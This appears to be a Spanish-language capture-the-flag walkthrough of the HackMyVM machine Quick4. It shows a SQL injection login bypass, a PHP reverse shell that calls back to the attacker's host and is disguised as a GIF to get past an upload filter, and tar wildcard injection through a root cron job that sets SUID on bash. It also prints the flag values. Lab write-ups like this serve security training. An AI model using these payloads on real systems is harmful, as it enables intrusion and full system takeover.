---
icon: flag
---

# Quick4 HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 03:20 EDT
Nmap scan report for 192.168.5.63
Host is up (0.0063s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f💿c7:19 (ECDSA)
|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
MAC Address: 08:00:27:AA:84:13 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
```

Veremos un puerto `80` en el que se aloja una pagina web, si entramos veremos una pagina normal y corriente dedicada a coches, pero en la parte de `Make Appointment` veremos un `login` si nos registramos y accedemos con dicha cuenta no veremos gran cosa, por lo que vamos a realizar un poco de `fuzzing` a la pagina en general.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.63/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/img                  (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 51414]
/.php                 (Status: 403) [Size: 277]
/images               (Status: 403) [Size: 277]
/modules              (Status: 403) [Size: 277]
/careers              (Status: 403) [Size: 277]
/css                  (Status: 403) [Size: 277]
/lib                  (Status: 403) [Size: 277]
/js                   (Status: 403) [Size: 277]
/customer             (Status: 200) [Size: 2172]
/404.html             (Status: 200) [Size: 5014]
/robots.txt           (Status: 200) [Size: 32]
/fonts                (Status: 403) [Size: 277]
/employee             (Status: 200) [Size: 3684]
Progress: 42734 / 882244 (4.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 42773 / 882244 (4.85%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, pero entre ellas veremos un sitio llamado `/employee` que es bastante interesante, por lo que si accedemos a el veremos un `login` de nuevo, esta vez no nos podremos registrar, por lo que vamos a probar a realizar un `SQLi` de forma muy basica a ver si por lo menos es vulnerable al mismo.

```
User: diseo@test.com
Pass: ' OR 1=1-- -
```

Veremos que hemos accedido directamente al panel `bypasseando` las credenciales del `admin` por lo que estaremos dentro.

Vamos a irnos a la seccion `Users -> Employeers` y aqui dentro vamos a irnos a la pestaña llamada `reset password`, cambiaremos la `password` de por ejemplo el usuario `Nick Greenhorn` a la que queramos, una vez echo esto, vamos a subirle una foto de perfil, pero vamos a probar a subirle un `.php` y si funciona loguearnos con dicho usuario para que se ejecute.

> image.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Si nos vamos a `Upload Photo`, seleccionamos dicho usuario y seleccionamos el archivo, cuando le demos a `Upload Photo` veremos que no funciona, por lo que podremos intentar interceptar la peticion con `BurpSuite` subiendo una imagen real, pero cuando la interceptemos cambiamos los datos a las de un `GIF` para que se haga pasar por `GIF` pero siendo el archivo del contenido `PHP`.

Una vez que la capturemos veremos esta peticion:

```
POST /employee/manageemployees.php HTTP/1.1
Host: 192.168.5.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------135343033037387587284031619760
Content-Length: 587
Origin: http://192.168.5.63
Connection: keep-alive
Referer: http://192.168.5.63/employee/manageemployees.php
Cookie: PHPSESSID=6r5660vh9murij8097lp1q08vc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------135343033037387587284031619760
Content-Disposition: form-data; name="user_id"

2
-----------------------------135343033037387587284031619760
Content-Disposition: form-data; name="fileToUpload"; filename="image.php"
Content-Type: application/x-php

<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>

-----------------------------135343033037387587284031619760
Content-Disposition: form-data; name="submit"

Upload Photo
-----------------------------135343033037387587284031619760--
```

Tendremos que cambiar la linea que pone:

```
Content-Type: application/x-php => image/gif
```

Y añadirle encima de la `reverse shell` la palabra `GIF8;` quedando de esta forma:

```
POST /employee/manageemployees.php HTTP/1.1
Host: 192.168.5.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------135343033037387587284031619760
Content-Length: 587
Origin: http://192.168.5.63
Connection: keep-alive
Referer: http://192.168.5.63/employee/manageemployees.php
Cookie: PHPSESSID=6r5660vh9murij8097lp1q08vc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------135343033037387587284031619760
Content-Disposition: form-data; name="user_id"

2
-----------------------------135343033037387587284031619760
Content-Disposition: form-data; name="fileToUpload"; filename="image.php"
Content-Type: image/gif

GIF8;
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>

-----------------------------135343033037387587284031619760
Content-Disposition: form-data; name="submit"

Upload Photo
-----------------------------135343033037387587284031619760--
```

Ahora si nos `logueamos` con dicho usuario en ese mismo `login`, pero antes nos ponemos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora nos `logueamos`...

```
User: nick.greenhorn@quick.hmv
Pass: <PASSWORD>
```

Y si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.62] 57256
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Por lo que leeremos la `flag` del usuario.

> user.txt

```
                                            ██████    █████  █████ █████   █████████  █████   ████    █████ █████ 
                                          ███░░░░███ ░░███  ░░███ ░░███   ███░░░░░███░░███   ███░    ░░███ ░░███  
                                         ███    ░░███ ░███   ░███  ░███  ███     ░░░  ░███  ███       ░███  ░███ █
                                        ░███     ░███ ░███   ░███  ░███ ░███          ░███████        ░███████████
                                        ░███   ██░███ ░███   ░███  ░███ ░███          ░███░░███       ░░░░░░░███░█
                                        ░░███ ░░████  ░███   ░███  ░███ ░░███     ███ ░███ ░░███            ░███░ 
                                         ░░░██████░██ ░░████████   █████ ░░█████████  █████ ░░████          █████ 
                                           ░░░░░░ ░░   ░░░░░░░░   ░░░░░   ░░░░░░░░░  ░░░░░   ░░░░          ░░░░░ 
                                                                                                                                                            


                                                                               %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                                       
                                                                           @@@:    .::.          :%@@@@@@@@@@@@@@@@@@@@@@@@@                                   
                                                                          @ @@                      :#@@@  @@@@@@@@@@@@@@@@@@                                  
                                                                          @                       @    %@  @% @@@@@@@@@@@@@@@@@                                
                                                                         @                         @     =   @ *@        @*@@@@@                               
                                                                        @             @@@@@@@@@@@@:      %     @ @        @.@@@@@                              
                                                                     - @                   :=%@@#      @       +@+@        @@@@@@@                             
                                                                    @ @                              =*=        @ @@ +#     @@@@@@@                            
                                                                  =@*-:      :@@          :#@@@@@@@#.            @@ @ @#    @*@@@@@@@@                         
                                                         =@@@@%:                                 :%@@@%      .%@@ : @@@      @@@@@@                 *@         
                                  :@@@@@+             #%:                                             ...         =                  .                 @       
                       =@@%              :@*                                        =@@@@*                                          @ @                  @     
              %@@  +@+@@        +@                                     *@@@@-                                     #                                       @    
         @: .@ @-          @                                  :@@*     =@@                                                                    @@@@@        =   
       @    @@@        @                                =%    @% @                                                                           @. @@@@       @   
      *@. @@  @ @   *                                    = @.                                                                               @     @@@      @ @ 
      *@ @@@@@ @.  @                +             - :  @%  @                               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%          =    .@@@@  @@@ @@@@@@  
       @@@@@  * @                =                @   @ @  @ @                     @@@@@@@@ @@@@@@@@@@@.@@@@@@@@@@@@@@@@@@@@@@@@@      @   @=#@*@@ @@@     @   
         *  @@@+                +@@ @            @ % % @=@  @ =                 *@@@@@@@@@@@@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=    %   @*@@ @@  @@@   %    
         .                                        @   @ @ @ @+-                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        %@@@@ @@  @ @ @      
         @@-# @   *@@@@@+       :@@@.              @@@@ @@@@*@                @@@@@      @@@@@@@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+          @@=@ %@@  @          
      @@@@@@@ *  @@@@@@@@@@@@@@@@@@@@=    .@+                                @@@@         %@@@@@@@@@@@@@@@@@@: @@@@@@@@@@@@@      @      @@:@@@@%= @@          
    @*      @@@@@@@@@@ @.@@@@@@@@@@@@@@@@@@@*      @@@*                     @@@@  @@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@     @         :@@@@@ @@@   @           
       %@@= %@@*:  @  @@ @ @@ @@ @@@@@@@@@@@@@@  @@-%@@@  @                @@@@%=@@@@@@@    @=@@@@@@@@@@@@@@@@@@                 @@ @@@@@@@@@    @@            
          @@@@:@=@@@@@@@%@:@=   =   @@@ @@@@@@ :@@ @@@@@@@@ :=             @@@@  @@@+ @@@   @@@@@@@@@@@                    @*         @@@@@*@@@@@              
          -+@@@ #@:@@@@   -@@ @@ @@-@@@ :*@            =@@@@@%@:=#@@@@=     @@@:@ @@@@=@@   @@@@@@@@                 @@                                        
              =@   @@ #@ @@  : @@@@@@@@ @@@@@@%      *%@*           -@:  @@@@@ @ .*@ @ #@   @@@@@@@@@         @%                                               
                  @@@.-:   @@ %  @@@@@@@@@@@@@ . @@ @@@@@@@@@@@@@@@@@%   @@@@@ @@@@@ @ @@   @@     +@   @                                                      
                      @         :=@@@+        @   :#@@@@@@@@ @.         @@@@@@ @   @+@=@@  -@@                                                                 
                        @@@@@@@@ @@@#:              @@@@@@@#           @@@+@@@ =@@@@  @@   @@                                                                  
                         =@@@@@@@@@@@@@@@-@@@@@@@.         :*%@@@@@@@@@@@@ @@@@ @@@=@ @    @@                                                                  
                             @@@@@@@@@                             @@@@@@@@@@@@  @@=@@    @@                                                                   
                                                                    @@@@@@@ @@@@        =@@                                                                    
                                                                    -@@@@@@@ @@@@@    #@@@                                                                     
                                                                      @@@@@@@ @@@@@@@@@@@                                                                      
                                                                           -@@@ @@@@@@                                                                         


                                                                                                                                                                 
                                                            HMV{7920c4596aad1b9826721f4cf7ca3bf0}
```

## Escalate Privileges

Despues de un rato buscando, si leemos los `crontabs` que hay a nivel de sistema, veremos lo siguiente:

```shell
cat /etc/crontab
```

Info:

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*/1 *   * * *   root    /usr/local/bin/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Vemos esta linea bastante interesante:

```
*/1 *   * * *   root    /usr/local/bin/backup.sh
```

Vamos a ver que contiene dicho `.sh`.

```shell
cat /usr/local/bin/backup.sh
```

Info:

```
#!/bin/bash
cd /var/www/html/
tar czf /var/backups/backup-website.tar.gz *
```

Vemos que esto conlleva una vulnerabilidad el `*`, si buscamos informacion sobre ello veremos esto:

URL = [Vulnerabilidad Tar Wildcard Injection](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)

Vamos a crearnos el siguiente archivo en `/var/www/html`.

> pwned.sh

```bash
#!/bin/bash

chmod u+s /bin/bash
```

Ahora vamos con la vulnerabilidad para que ejecute dicho `.sh`.

```shell
echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=bash pwned.sh"
```

Ahora tendremos que esperar mas o menos `1` minuto y si comprobamos los permisos de la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Veremos que ha funcionado, por lo que haremos lo siguiente para ser `root`.

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```

                                            ██████    █████  █████ █████   █████████  █████   ████    █████ █████ 
                                          ███░░░░███ ░░███  ░░███ ░░███   ███░░░░░███░░███   ███░    ░░███ ░░███  
                                         ███    ░░███ ░███   ░███  ░███  ███     ░░░  ░███  ███       ░███  ░███ █
                                        ░███     ░███ ░███   ░███  ░███ ░███          ░███████        ░███████████
                                        ░███   ██░███ ░███   ░███  ░███ ░███          ░███░░███       ░░░░░░░███░█
                                        ░░███ ░░████  ░███   ░███  ░███ ░░███     ███ ░███ ░░███            ░███░ 
                                         ░░░██████░██ ░░████████   █████ ░░█████████  █████ ░░████          █████ 
                                           ░░░░░░ ░░   ░░░░░░░░   ░░░░░   ░░░░░░░░░  ░░░░░   ░░░░          ░░░░░ 
                                                                                                                                                            
                                                                                                                    x$$$$$$                                      
                                                                                                                   $$X&&&&&xXX$$$                                
                                                                                                                  $X&&&&&&&&&&$X+xX$+X$                          
                                                           x$$$$$$;+++;                                 $XXxXX$$$xxX$$$&&&&&&&&&&$    $X                         
                                                            ;X$&&&&&+xxXxxxxXX$$XXx+X+xxx+;;          $X$+XXXX$$$XX&&&&&&&$&$$$$                                 
                                                                    $XXXXxX$&&&&&&&$X:+xxXXxxx++;   $X:+xxxxxxXX$&X                                              
                                                                                  X$&&& ;XXXxxxx+++$$ ++++++++x$X                                                
                                                                                         +XXXxxxx+$$+++++++++x$X                                                 
                                                                                          +xXXxxx$$ ++++++++XXX                                                  
                                                                                          ::XXXXX& x;;;;++++X:                                                   
                                                                                        &   &XxX& &&&& &&++X&$X;                                                 
                                                                                  $$XXXXXxx+++++++++xXXX$$$$x$X$$XX                                              
                                                                              .&&&X$;+;::    :;X;;+xx+xxX&&:XX&&&&$XX$X;                                         
                                                                              XX           :+XxxXXXXXx+X+;   ;$     $X$&;&                                       
                                                                            :;&           xX XXxxxX          ;$         $&&                                      
                                                                           ;+&           xX     $XX          :$          &&X &                                   
                                                                          +x            :&       .XX  ; .     &           &&  :                                  
                                                                         +x    +  X&$$$Xx&XX  Xx::+:x    &XX+.&&&&&&&&&&&&&$x                                    
                                                                  +    +;X$;:++;;:+X;+;;+++;$xX$$$XX$;;:; .;:xXXx++;;X$&&&&&&+;X+                                
                                          ;;++xxxX$$$$$$$++:+$$$; ...:::::::xXxx+XX$$$XXX+:.:;+xXXXX$X$X+x$X+X$X:$&&&&&&&&&$&&&$;++++;;;;                        
                                 ++xxxxxxxxXXXXXXXx$;;xxx+:..::::::::+xxxx++X$$X+:+++++++++++XXXXXXXXXXX+++++++++++++X;$X&&&&&&&&&;;;:;;;;;:                     
                            +xxxxxxxxxxxxxxxXXX+++xx;:::::;;;;+:++xxxx+++++:+++++++++++++++++++++++;+;;;;;;;;;;;;;;;$&&Xx&& x. ;&$&;;;;++;;;;                    
                        ;xx++++++++++xxxXXX+++++;;;;;;+++++;;++++++++++++++++++++++++++++;;;;;;;;;;;;;;;;;;;;;;;;;;;+x&;&&& $$X&&$&++;;;+++;;;                   
                     .    :+++++++++XXXx;;+++;;++++++++++;+++++++++++:++++++++++++;;;;;;;;+x+XX++++++;;;;;;;;;:::;;;;X$&&&&&&&&&&&&++&$X+&&&+;                   
                     :   .  ;;;;+XXXx:;+++;++++++++++++++++++++++++      ;;;;;;;;;;:;+++++;;;;;;;+xX$$Xx+++;;;;;;;;;;;X&&&&$&$$&$$++;$&&&$&&++                   
                    X   .  :+;:xXx++++++++++:++++++++++++++++++;++::   :  .;;::::;+;;;.X$&&&&&&&&&&&&++;;;;;$$$$$$+;;+;&&X++++++++++$+ XX&+&$+                   
                    .:     &X.;++:;;;;;;;++;+;;+;;;;;;;;;;;;;;:;: .    .+.+;;::.::;;:;;;&&$&&&$$&&&&&&+++;;::X$$$$$+++++++++++++++++$ + +&&&$+&                  
                     x:  :+&x;X$$++;;;;;::;+X$$XX++;;;;;;;::::::  :   . :;xX+;;;;;:;;;;&$&&&&&&&$&&&&&++++++;X$$$$$;++++++++++++++xx++   X&&$X                   
                     $X;;+Xx++XX&&&&&&&&&&X& &&&&&&&&&&&+;X$$XXx:X&  :  :X$$X++;;;;;;+X&&; .X ;&&&&&&&&xxxxxx$$$$$$XXX+xXXXXXXXXX$X: :   :&&Xx                   
                      ;..&+xXX.  X&&&&&;&& &&.&&&&&&&&&&&&&&&&+XXX$.;  ;$x$$$Xx++xxxxx&$&   :X:;&&&&&&$XXXXXX$$X$x+XXXXXXx   .X$XXXX.X  :$&                      
                     X+&&x;;$$$.&&&&&&&;&&  &&x         :;+X&&$X$XXXXx+XXX$$$$XxxxXXX$&:  +  .x &&&&&&$XXXXXXXXx;   :X$XXXXXXXXXXXX$+:$+ &&                      
                     :;&&&X$$$$$x&&&&&&&&&&&&;+&&&&&&&&&&&&&&+. $XXXx.x&XXX$$$XXXXXXX&.  ;   .  &&&&&&&:  :x$$XXXXXXXXXXXXXXXX$$$$$&X   $&                       
                      ;X&&   X+;$;.;;X&&& &&&X&&&&&&&&&&&&&&&++;:$$$$ ;&XxxxX$$XXXXX&&& X       &&&&&&$XXXXXXXXXXXX$$$$$$$$$$&&&&&&&&X&$&&                       
                  Xx++;x$&;;: : :$++$&&+;.    :;;;;;;;;;::   :X  $&$$&&&$$$$&&$$$$$$&&. $:   .  &&&&&&&$$$$$$$$$$$$$$$$        &&&&&&&&&&     ::                 
                       :&&&$$&$Xx+;&&&&&&&&&&&&&&++&xxxxxx   :+X+                  :&&;:x$;::;  &&&&&&&$$$$$&&                   &&&&&&         :                
                      $&&       &&&&&&&&&&&&&&&&&:X++xxxxx:;+:+XX;:;xxxXX+xxx+++XXXX&&X&+X$xX: &&&                                             .                 
                                  &&&&&$$&&&&&&&&              :$&&&&&&&&&&&&&&&&&&&&&$: &.&; &&&&                                                               
                                    &&&&&&&&&&               +XX              &&&&&&&&&$X   :&&&&                                                                
                                                                               &&&&&&&&&&$$&&&&                                                                  
                                                                                &&&&&&&&&&&&&&                                                                   
                                                                                   &&&&&&&&                                                                      
                                                                                                                                                                 
                                                            HMV{858d77929683357d07237ef3e3604597}
```
